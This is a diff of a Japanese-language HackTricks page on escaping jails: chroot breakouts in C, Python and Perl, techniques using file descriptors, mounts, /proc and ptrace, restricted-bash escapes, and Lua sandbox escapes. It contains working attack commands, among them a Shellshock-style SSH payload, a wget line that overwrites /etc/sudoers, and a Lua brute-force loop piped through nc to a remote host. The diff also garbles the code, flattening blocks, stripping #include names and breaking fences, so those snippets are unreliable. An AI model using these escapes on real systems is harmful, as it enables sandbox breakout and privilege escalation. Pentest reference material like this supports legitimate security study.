@@ -1,4 +1,4 @@
-# Jails からの脱出
+# Escaping from Jails
 
 <details>
 
@@ -40,24 +40,14 @@ chroot 内で **root** であれば、**新しい chroot を作成すること�
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("chroot-dir", 0755);
-chroot("chroot-dir");
-for(int i = 0; i < 1000; i++) {
-chdir("..");
-}
-chroot(".");
-system("/bin/bash");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }
+
+````
 </details>
 
 <details>
@@ -68,37 +58,23 @@ Pythonを使用して制限されたbashシェルから脱出する方法はい�
 
 ```python
 python -c 'import os; os.system("/bin/sh")'
-```
+````
 
 このコマンドは、Pythonを介して`/bin/sh`を実行し、制限されたbash環境から脱出します。
 
 </details>
-```python
-#!/usr/bin/python
-import os
-os.mkdir("chroot-dir")
-os.chroot("chroot-dir")
-for i in range(1000):
-os.chdir("..")
-os.chroot(".")
-os.system("/bin/bash")
-```
+
+\`\`\`python #!/usr/bin/python import os os.mkdir("chroot-dir") os.chroot("chroot-dir") for i in range(1000): os.chdir("..") os.chroot(".") os.system("/bin/bash") \`\`\`
+
 <details>
 
 <summary>Perl</summary>
 
+
+
 </details>
-```perl
-#!/usr/bin/perl
-mkdir "chroot-dir";
-chroot "chroot-dir";
-foreach my $i (0..1000) {
-chdir ".."
-}
-chroot ".";
-system("/bin/bash");
-```
-</details>
+
+\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`
 
 ### Root + 保存されたfd
 
@@ -109,31 +85,20 @@ system("/bin/bash");
 <details>
 
 <summary>C: break_chroot.c</summary>
-```c
-#include <sys/stat.h>
-#include <stdlib.h>
-#include <unistd.h>
 
-//gcc break_chroot.c -o break_chroot
+\`\`\`c #include #include #include
 
-int main(void)
-{
-mkdir("tmpdir", 0755);
-dir_fd = open(".", O_RDONLY);
-if(chroot("tmpdir")){
-perror("chroot");
-}
-fchdir(dir_fd);
-close(dir_fd);
-for(x = 0; x < 1000; x++) chdir("..");
-chroot(".");
-}
-```
+//gcc break\_chroot.c -o break\_chroot
+
+int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }
+
+````
 </details>
 
 ### Root + Fork + UDS (Unix Domain Sockets)
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 FDはUnix Domain Socketsを介して渡すことができるため、以下の手順を実行します。
 
 * 子プロセスを作成（fork）
@@ -142,39 +107,48 @@ FDはUnix Domain Socketsを介して渡すことができるため、以下の�
 * 親プロセスで、新しい子プロセスのchroot外にあるフォルダのFDを作成
 * そのFDをUDSを使用して子プロセスに渡す
 * 子プロセスはそのFDにchdirし、chrootの外にあるため、脱獄する
-{% endhint %}
+
+</div>
 
 ### Root + Mount
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * ルートデバイス（/）をchroot内のディレクトリにマウント
 * そのディレクトリにchrootする
 
 これはLinuxで可能です
-{% endhint %}
+
+</div>
 
 ### Root + /proc
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * chroot内のディレクトリにprocfsをマウント（まだされていない場合）
 * 異なるroot/cwdエントリを持つpidを探す、例えば：/proc/1/root
 * そのエントリにchrootする
-{% endhint %}
+
+</div>
 
 ### Root(?) + Fork
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * Fork（子プロセス）を作成し、FS内のより深いフォルダにchrootし、CDを実行
 * 親プロセスから、子プロセスがいるフォルダを子プロセスのchrootより前のフォルダに移動
 * この子プロセスは自分がchrootの外にいることに気づく
-{% endhint %}
+
+</div>
 
 ### ptrace
 
-{% hint style="warning" %}
+<div data-gb-custom-block data-tag="hint" data-style='warning'>
+
 * 以前はユーザーが自分のプロセスを自分自身のプロセスからデバッグできましたが、これはデフォルトではもう可能ではありません
 * それでも可能であれば、プロセスにptraceしてシェルコードを実行できます（[この例を参照](linux-capabilities.md#cap_sys_ptrace)）。
-{% endhint %}
+
+</div>
 
 ## Bash Jails
 
@@ -187,48 +161,61 @@ echo $PATH
 env
 export
 pwd
-```
-### PATHの変更
+````
+
+#### PATHの変更
 
 PATH環境変数を変更できるか確認してください
+
 ```bash
 echo $PATH #See the path of the executables that you can use
 PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
 echo /home/* #List directory
 ```
-### vimの使用
+
+#### vimの使用
+
 ```bash
 :set shell=/bin/sh
 :shell
 ```
-### スクリプトの作成
+
+#### スクリプトの作成
 
 実行可能なファイルを _/bin/bash_ の内容で作成できるか確認してください
+
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
-### SSHからbashを取得する
+
+#### SSHからbashを取得する
 
 ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます:
+
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### 宣言
+
+#### 宣言
+
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
-### Wget
+
+#### Wget
 
 例えばsudoersファイルを上書きすることができます
+
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
-### その他のテクニック
+
+#### その他のテクニック
 
 以下のページでは、制限されたLinuxシェルからの脱出テクニックについて説明しています。
 
@@ -237,38 +224,37 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 [https://gtfobins.github.io](https://gtfobins.github.io)\
 **また、以下のページも参考になるでしょう：**
 
-{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
-[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
-{% endcontent-ref %}
-
-## Python Jails
+### Python Jails
 
 Python jailsから脱出するテクニックについては、以下のページを参照してください：
 
-{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
-{% endcontent-ref %}
-
-## Lua Jails
+### Lua Jails
 
 Lua内でアクセス可能なグローバル関数については、このページを参照してください： [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
 **コマンド実行を伴うEval:**
+
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
+
 **ドットを使用せずにライブラリの関数を呼び出すためのいくつかのコツ：**
+
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
+
 ライブラリの関数を列挙する：
+
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
+
 ```markdown
 前述のワンライナーを**異なるlua環境で実行するたびに、関数の順序が変わる**ことに注意してください。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードしてライブラリの最初の関数を呼び出すことにより、ブルートフォース攻撃を行うことができます：
 ```
+
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -279,24 +265,17 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
+
 **インタラクティブなluaシェルを取得する**: 制限されたluaシェル内にいる場合、次の呼び出しによって新しいluaシェル（そして願わくば無制限の）を取得できます:
+
 ```bash
 debug.debug()
 ```
-## 参考文献
+
+### 参考文献
 
 * [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))
 
-<details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>
-
-HackTricks をサポートする他の方法:
-
-* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)や [**telegram グループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
-* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
